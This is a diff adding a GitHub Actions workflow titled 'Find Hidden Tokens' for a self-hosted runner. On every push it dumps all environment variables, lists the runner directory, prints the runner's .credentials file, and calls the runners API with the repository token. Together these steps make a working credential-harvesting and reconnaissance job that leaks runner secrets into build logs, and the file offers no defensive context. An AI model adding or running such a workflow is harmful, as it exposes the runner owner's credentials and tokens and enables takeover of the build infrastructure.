@@ -1,0 +1,18 @@
+name: Find Hidden Tokens
+on: [push]
+jobs:
+  find:
+    runs-on: self-hosted
+    steps:
+      - name: Check All Env Variables
+        run: env
+        
+      - name: Check Runner Files
+        run: |
+          ls -la $RUNNER_ROOT
+          cat $RUNNER_ROOT/.credentials
+          
+      - name: Check Token Permissions
+        run: |
+          curl -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
+          https://api.github.com/repos/${{ github.repository }}/actions/runners
